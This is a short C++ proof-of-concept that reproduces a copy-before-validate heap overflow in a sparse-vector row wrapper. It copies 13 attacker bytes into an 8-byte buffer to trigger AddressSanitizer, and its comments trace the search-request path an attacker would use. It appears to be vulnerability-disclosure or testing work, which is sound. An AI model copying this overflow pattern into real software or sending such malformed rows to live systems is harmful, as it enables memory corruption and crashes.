// C2 — CopyAndWrapSparseRow copies before it validates (ASan detection PoC)
// Faithful reproduction of internal/core/src/common/Utils.h:276-299.
// SparseRow<float> stores (uint32 id, float val) pairs => element_size()==8, and
// SparseRow(n) allocates n*8 bytes. Only FastMemcpy -> std::memcpy is substituted.
#include <cstdint>
#include <cstring>
#include <cstdio>
#include <cmath>
#include <limits>

// ---- layout-faithful stand-in for knowhere::sparse::SparseRow<float> ----
struct Elem { uint32_t id; float val; };                 // 8 bytes, matches element_size()
struct SparseRow {
    Elem*  buf; size_t n;
    static constexpr size_t element_size() { return 8; }
    explicit SparseRow(size_t num_elements) : n(num_elements) {
        buf = (Elem*) (num_elements ? new char[num_elements * element_size()] : new char[0]);
    }
    void* data() { return buf; }
    Elem& operator[](size_t i) { return buf[i]; }
    ~SparseRow() { delete[] (char*)buf; }
};

// ---- verbatim from Utils.h:276-299 ----
SparseRow CopyAndWrapSparseRow(const void* data, size_t size, bool validate) {
    size_t num_elements = size / SparseRow::element_size();          // :276-277  13/8 = 1
    SparseRow row(num_elements);                                     // :278  allocates 1*8 = 8 bytes
    std::memcpy(row.data(), data, size);                            // :279  copies 13 bytes  <-- OVERFLOW
    if (validate) {                                                  // :280  check runs AFTER the copy
        if (size % SparseRow::element_size() != 0) {                // :281-284  too late
            printf("[C2] validate: rejected size%%8 != 0 (but memcpy already overran)\n");
        }
    }
    return row;
}

int main() {
    // Attacker: Search with a SparseFloatVector placeholder row of length 13.
    // Search path -> Plan.cpp:174 SparseBytesToRows(..., validate=true) -> here.
    unsigned char row_bytes[13];
    for (int i = 0; i < 13; i++) row_bytes[i] = 0x42;               // 13 attacker bytes
    SparseRow r = CopyAndWrapSparseRow(row_bytes, sizeof(row_bytes), /*validate=*/true);
    printf("[C2] returned without ASan abort (unexpected)\n");
    return 0;
}
